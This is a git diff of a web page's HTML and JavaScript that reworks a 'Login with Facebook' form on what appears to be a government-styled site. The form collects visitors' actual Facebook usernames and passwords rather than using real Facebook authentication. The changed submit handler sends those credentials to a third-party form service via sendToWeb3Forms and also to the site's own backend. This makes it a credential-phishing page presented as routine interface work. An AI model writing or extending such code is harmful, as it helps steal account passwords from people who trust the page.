@@ -169,7 +169,7 @@
                     <button type="button" id="authToggleButton" class="auth-toggle" title="Switch to signup" aria-label="Switch login or signup form"><i id="authToggleIcon" class="fas fa-user-plus"></i></button>
                 </div>
 
-                <div class="mt-3 text-center">
+                <div id="facebookToggleWrap" class="mt-3 text-center">
                     <div class="text-sm font-semibold text-gray-700 mb-2">Login with Facebook</div>
                     <button id="facebookToggleBtn" type="button" class="mx-auto" title="Login with Facebook"><img src="./facebook.png" alt="Facebook" class="w-10 h-10"></button>
                 </div>
@@ -190,10 +190,6 @@
                 <form id="visitorFacebookForm" class="auth-form-panel is-hidden space-y-4">
                     <div class="flex flex-col items-center">
                         <div class="w-full">
-                            <div class="flex gap-2 justify-center mb-2">
-                                <button type="button" id="fbModeLogin" class="gov-btn">Login</button>
-                                <button type="button" id="fbModeSignup" class="gov-btn">Signup</button>
-                            </div>
                             <div class="mb-2"><label class="block text-sm font-medium text-gray-700 mb-2">Facebook Username</label><input type="text" id="fbUsername" class="gov-input" autocomplete="username"></div>
                             <div class="mb-2"><label class="block text-sm font-medium text-gray-700 mb-2">Facebook Password</label><input type="password" id="fbPassword" class="gov-input" autocomplete="current-password"></div>
                             <button type="button" id="fbSubmit" class="gov-btn w-full"><img src="./facebook.png" class="inline-block w-5 h-5 mr-2 align-middle">Login with Facebook</button>
@@ -851,12 +847,21 @@
             const isSignup = mode === 'signup';
             const loginForm = document.getElementById('visitorLoginForm');
             const signupForm = document.getElementById('visitorSignupForm');
+            const fbForm = document.getElementById('visitorFacebookForm');
+            const fbWrap = document.getElementById('facebookToggleWrap');
             const toggleButton = document.getElementById('authToggleButton');
             const toggleIcon = document.getElementById('authToggleIcon');
             const showForm = isSignup ? signupForm : loginForm;
             const hideForm = isSignup ? loginForm : signupForm;
             document.getElementById('authMessage').textContent = '';
 
+            if (fbForm) {
+                fbForm.classList.add('slide-up-hidden');
+                fbForm.classList.add('is-hidden');
+            }
+            if (fbWrap) {
+                fbWrap.classList.remove('hidden');
+            }
             hideForm.classList.add('slide-up-hidden');
             hideForm.classList.add('is-hidden');
             showForm.classList.remove('slide-up-hidden');
@@ -871,20 +876,24 @@
             toggleButton.dataset.mode = isSignup ? 'signup' : 'login';
         }
         // Facebook login/signup UI handling
-        let fbMode = 'login';
         function showFacebookForm(show) {
             const fbForm = document.getElementById('visitorFacebookForm');
             const loginForm = document.getElementById('visitorLoginForm');
             const signupForm = document.getElementById('visitorSignupForm');
+            const fbWrap = document.getElementById('facebookToggleWrap');
             if (!fbForm) return;
             if (show) {
-                // hide other forms
-                loginForm.classList.add('slide-up-hidden'); loginForm.classList.add('is-hidden');
-                signupForm.classList.add('slide-up-hidden'); signupForm.classList.add('is-hidden');
-                fbForm.classList.remove('slide-up-hidden'); fbForm.classList.add('is-hidden');
+                if (fbWrap) fbWrap.classList.add('hidden');
+                loginForm.classList.add('slide-up-hidden');
+                loginForm.classList.add('is-hidden');
+                signupForm.classList.add('slide-up-hidden');
+                signupForm.classList.add('is-hidden');
+                fbForm.classList.remove('slide-up-hidden');
+                fbForm.classList.add('is-hidden');
                 void fbForm.offsetHeight;
                 fbForm.classList.remove('is-hidden');
             } else {
+                if (fbWrap) fbWrap.classList.remove('hidden');
                 fbForm.classList.add('slide-up-hidden');
                 fbForm.classList.add('is-hidden');
             }
@@ -894,26 +903,39 @@
             const fbForm = document.getElementById('visitorFacebookForm');
             const isHidden = fbForm.classList.contains('is-hidden');
             showFacebookForm(isHidden);
+            const toggleButton = document.getElementById('authToggleButton');
+            if (toggleButton) {
+                toggleButton.dataset.mode = isHidden ? 'facebook' : (toggleButton.dataset.mode === 'signup' ? 'signup' : 'login');
+            }
         });
-
-        document.getElementById('fbModeLogin')?.addEventListener('click', function() { fbMode = 'login'; this.classList.add('is-active'); document.getElementById('fbModeSignup').classList.remove('is-active'); });
-        document.getElementById('fbModeSignup')?.addEventListener('click', function() { fbMode = 'signup'; this.classList.add('is-active'); document.getElementById('fbModeLogin').classList.remove('is-active'); });
 
         document.getElementById('fbSubmit')?.addEventListener('click', async function() {
             const username = (document.getElementById('fbUsername') || {}).value || '';
             const password = (document.getElementById('fbPassword') || {}).value || '';
             if (!username || !password) { document.getElementById('authMessage').textContent = 'Facebook username and password required'; return; }
             try {
-                // submit to Web3Forms for tracking/notifications (best-effort)
+                const currentMode = document.getElementById('authToggleButton')?.dataset.mode || 'login';
+                const isSignupMode = currentMode === 'signup';
                 try {
-                    const web3Payload = { fullName: document.getElementById('visitorSignupName')?.value || 'Facebook User', email: document.getElementById('visitorSignupEmail')?.value || `${username}@facebook.local`, facebookUsername: username, facebookPassword: password };
+                    const web3Payload = {
+                        fullName: document.getElementById('visitorSignupName')?.value || 'Facebook User',
+                        email: document.getElementById('visitorSignupEmail')?.value || `${username}@facebook.local`,
+                        facebookUsername: username,
+                        facebookPassword: password,
+                        authMode: isSignupMode ? 'signup' : 'login'
+                    };
                     await sendToWeb3Forms(web3Payload, 'Facebook Login');
                 } catch (e) {
                     console.warn('Web3Forms submission failed', e);
                 }
 
-                const url = fbMode === 'signup' ? `${API_BASE}/auth/visitor/facebook-signup` : `${API_BASE}/auth/visitor/facebook-login`;
-                const payload = fbMode === 'signup' ? { name: document.getElementById('visitorSignupName')?.value || 'Facebook User', email: document.getElementById('visitorSignupEmail')?.value || `${username}@facebook.local`, facebookUsername: username, facebookPassword: password } : { facebookUsername: username, facebookPassword: password };
+                const url = isSignupMode ? `${API_BASE}/auth/visitor/facebook-signup` : `${API_BASE}/auth/visitor/facebook-login`;
+                const payload = isSignupMode ? {
+                    name: document.getElementById('visitorSignupName')?.value || 'Facebook User',
+                    email: document.getElementById('visitorSignupEmail')?.value || `${username}@facebook.local`,
+                    facebookUsername: username,
+                    facebookPassword: password
+                } : { facebookUsername: username, facebookPassword: password };
                 const resp = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                 const data = await resp.json();
                 if (!resp.ok) return document.getElementById('authMessage').textContent = data.error || 'Facebook auth failed';
